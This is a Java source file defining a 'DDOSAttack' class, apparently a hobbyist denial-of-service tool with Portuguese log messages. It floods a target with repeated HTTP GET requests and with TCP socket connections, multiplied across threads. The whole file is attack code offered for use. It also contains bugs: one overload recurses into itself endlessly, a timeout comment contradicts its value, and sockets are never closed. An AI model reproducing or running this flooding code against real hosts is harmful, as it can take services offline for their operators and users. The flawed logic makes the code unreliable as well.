import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;

/**
 * @Author: Douglas A. Giovanella
 * @Email: douglas_giovanella@hotmail.com
 * @Date: 25/07/2018
 */
public class DDOSAttack {

    private AttackCallback callback;

    private URL mHostURL;

    DDOSAttack(String host, AttackCallback callback) {
        try {
            this.callback = callback;
            mHostURL = new URL(host);
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }

    void httpAttack(int requisitionQuantity) {
        new Thread(() -> {
            int i = 0;
            callback.onStarted();
            System.out.println("Ataque iniciado em: " + mHostURL.getHost());
            while (i < requisitionQuantity) {
                try {
                    HttpURLConnection conn = (HttpURLConnection) mHostURL.openConnection();
                    conn.setAllowUserInteraction(true);
                    conn.setConnectTimeout(5000); // 15 sec. connection timeout
                    conn.setDoInput(true);
                    conn.setDoOutput(false);
                    conn.setUseCaches(false);
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("Content-type", "text/html; charset=" + "UTF-8");

                    conn.connect();
                    System.out.println("Ataque frenetico nº" + i + " -> status: " + conn.getResponseCode());
                } catch (Exception e) {
                    System.out.println(e.getMessage());
                }
                i++;
            }
            callback.onFinish();
            System.out.println("Ataque finalizado!");
        }).start();
    }

    void httpAttack(int requisitionQuantity, int threadQuantity) {
        for (int i = 0; i < threadQuantity; i++) {
            httpAttack(requisitionQuantity, threadQuantity);
        }
    }

    public void tcpAttack(int durationInMilli) {
        new Thread(() -> {
            try {
                long endTime = System.currentTimeMillis() + durationInMilli;
                while (System.currentTimeMillis() < endTime) {
                    new Socket(mHostURL.getHost(), mHostURL.getPort());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public void tcpAttack(int durationInMilli, int threadQuantity) {
        for (int i = 0; i < threadQuantity; i++) {
            tcpAttack(durationInMilli);
        }
    }
}